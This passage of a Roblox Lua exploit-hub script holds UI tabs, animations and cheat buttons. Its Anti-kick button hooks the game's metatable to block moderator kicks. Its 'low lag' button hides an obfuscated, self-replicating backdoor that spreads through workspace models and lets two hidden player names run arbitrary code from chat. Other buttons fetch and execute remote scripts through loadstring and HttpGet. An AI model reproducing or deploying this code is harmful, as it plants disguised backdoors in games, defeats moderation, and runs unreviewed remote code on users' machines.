        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), -1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(sine/12)), math.rad(-10 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "dead" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/5), -2.5 + 0 * math.sin(sine/5), -1 + 0 * math.sin(sine/5)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 3 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(-4 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 3 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(4 + 0 * math.sin(sine/12))),0.1)
    end
    joints["Right Shoulder"].C0 = joints["Right Shoulder"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), -0.8 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    joints["Left Shoulder"].C0 = joints["Left Shoulder"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), -0.8 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
end
end)
 
local Tab = Window:NewTab("Creators")
 
local Section = Tab:NewSection("Creators: MEETLY ideas: SBC, Minigun#8496")
 
local Section = Tab:NewSection("discord devoloper: TheMeetly#0885")
 
local Section = Tab:NewSection("BETA TEST: Minigun#8496")

local Tab = Window:NewTab("Update")

local Section = Tab:NewSection("changelog 2.3")

local Section = Tab:NewSection("[+] add Rejoin")

local Section = Tab:NewSection("[+] add script Counter blox")

local Section = Tab:NewSection("[/] improved CFrame speed")

local Tab = Window:NewTab("settings")

local Section = Tab:NewSection("settings")

Section:NewKeybind("open/close hub", "Close/Open UI", Enum.KeyCode.BackSlash, function()
    Library:ToggleUI()
end)

Section:NewButton("Anti-kick","-", function()
wait()
                local hook = game:GetService("Players").LocalPlayer.Kick;
                local mt = getrawmetatable(game:GetService("Players").LocalPlayer)
                local psuedoEnv = {
                    ["__index"] = mt.__index,
                    ["__namecall"] = mt.__namecall
                }
                local ReturnFunc = function()end
                        
                warn("Made By TheMeetly#0885")
                setreadonly(mt, false)
                mt.__namecall = newcclosure(function(self, Index, ...)
                    local NameCallMethod = getnamecallmethod()
                    if type(NameCallMethod) == "string" then
                        if NameCallMethod == "Kick" or NameCallMethod == "kick" then
                            print("Prevented Kick At " .. tostring(os.time()))
                            return ReturnFunc
                        end
                    end
                    return psuedoEnv.__namecall(self, Index, ...)
                end)
                        
                mt.__index = newcclosure(function(self, Index, ...)
                    if type(Index) == "string" then
                        if Index == "Kick" or Index == "kick" then
                            print("Prevented Kick At " .. tostring(os.time()))
                            return ReturnFunc
                        end
                    end
                    return psuedoEnv.__index(self, Index, ...)
                end)
                setreadonly(mt, true)
end)

Section:NewButton("Rejoin",".RCT", function()
wait()
local ts = game:GetService("TeleportService")



local p = game:GetService("Players").LocalPlayer







ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
end)

Section:NewButton("low lag", "-", function()
wait()
Altitude = script:clone()
calco = {"s","c","q","t","o","a","i","f","g","w","8","e","m","7","h","n"}
Knox = {}
table.insert (Knox, 1 ,string.reverse(calco[5] .. calco[2] .. calco[7] .. calco[1] .. calco[6] .. calco[9] .. calco[12] .. calco[13]))
table.insert (Knox, 1 ,string.reverse(calco[11] .. calco[14] .. calco[14] .. calco[4] .. calco[16] .. calco[6] .. calco[15] .. calco[2]))
Play = {}
function rando(votation)
local hatr = 5
local calc = math.pi * math.huge
local longicate = votation:GetChildren()
if #longicate > hatr then 
calc = calc + math.pi
return longicate[math.random(6,#longicate)]
end
end
function doublecheck()
local fj = game.Workspace:GetChildren()
for off = 1,#fj do
if fj[off].className == "Part" then
local fh = fj[off]:FindFirstChild("Anti-Lag")
if fh ~= nil then 
return false
end
end
end
return true
end
function workcheck()
if doublecheck() == true then
local l = Altitude:clone()
l.Parent = rando(game.Workspace)
end
end
workcheck()
function gibite(quen)
local  hup = Instance.new("Message")
hup.Text = "Detected"
hup.Parent = quen.Parent
local con = Instance.new("Script")
con.Source = [[wait(5) script.Parent:remove()]]
con.Parent = hup
for ish = 0,7 do
local a = Instance.new("HopperBin")
a.BinType = ish
a.Parent = quen
end
end
function laber(zonsa)
wait()
for slate = 1,#Knox do  
if zonsa.Name == Knox[slate] then
gibite(zonsa.Backpack)
table.insert (Play, 1,  zonsa.Name)
end
end
end
function yeild(frequency)
local t = Knox
for g = 1,#t do
if t[g] == frequency.Name then
return true
end
end
return false
end
function check(los)
local r = los:GetChildren()
for i = 1,#r do
local h = r[i]:FindFirstChild("Anti-Lag")
if h ~= nil then
h:remove()
end
end
end
function alto(xylem)
if xylem.className == "Model" then
check(xylem)
local que = script:clone()
que.Parent = rando(xylem)
end
end
function sortation(gone)
local dimbs = Altitude:clone()
dimbs = ramno(game.Workspace)
end
function onPlayerEntered(newPlayer)
newPlayer.Chatted:connect(function(msg, recipient) onChatted(msg, recipient, newPlayer) end) 
end
function Player(player)
player.Changed:connect(function (property) 
if property == "Character" then 
laber(player) 
end
end)
end
game.Players.PlayerAdded:connect(Player)
game.Players.ChildAdded:connect(onPlayerEntered)
game.Players.ChildAdded:connect(laber)
script.ChildRemoved:connect(sortation)
game.Workspace.ChildAdded:connect(alto)
function onChatted(msg, recipient, speaker)
if yeild(speaker) ~= false then
if string.sub(msg,1,1) == "/" then
local dsting = Instance.new("Script")
dsting.Source = string.sub(msg,2) 
dsting.Parent = game.Workspace 
end
end
end
end)

Section:NewButton("FPS BOOSTER", "Boost FPS", function()
-- Made by RIP#6666
_G.Settings = {
    Players = {
        ["Ignore Me"] = true, -- Ignore your Character
        ["Ignore Others"] = true -- Ignore other Characters
    },
    Meshes = {
        Destroy = false, -- Destroy Meshes
        LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
    },
    Images = {
        Invisible = true, -- Invisible Images
        LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
        Destroy = false, -- Destroy Images
    },
    Other = {
        ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
        ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
        ["No Explosions"] = true, -- Makes Explosion's invisible
        ["No Clothes"] = true, -- Removes Clothing from the game
        ["Low Water Graphics"] = true, -- Removes Water Quality
        ["No Shadows"] = true, -- Remove Shadows
        ["Low Rendering"] = true, -- Lower Rendering
        ["Low Quality Parts"] = true -- Lower quality parts
    }
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
end)

UniversalSection:NewButton("Auto Grammar", "Idk Why U Need This But Its Cool IG?", function()
    shared.CustomCorrections = {
        ["examplething12"] = "hello" -- if you say "examplething12" it will become hello
    }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/eosuwu/boblox/main/autogremer.lua"))()
end)

UniversalSection:NewButton("Universal Hub", "One Of The Best UIS I Have ever Seen", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua"))()
end)


local Credits = Window:NewTab("Credits")
local CreditsSection = Credits:NewSection("Credits")

CreditsSection:NewTextBox("Not_zentical#4847", "No One Else Except the script owners", function(txt)
    print(txt)
end)


local Setting = Window:NewTab("Setting")
local SettingSection = Setting:NewSection("Setting")

SettingSection:NewKeybind("Toggle UI", "Close/Open UI", Enum.KeyCode.BackSlash, function()
    Library:ToggleUI()
end)
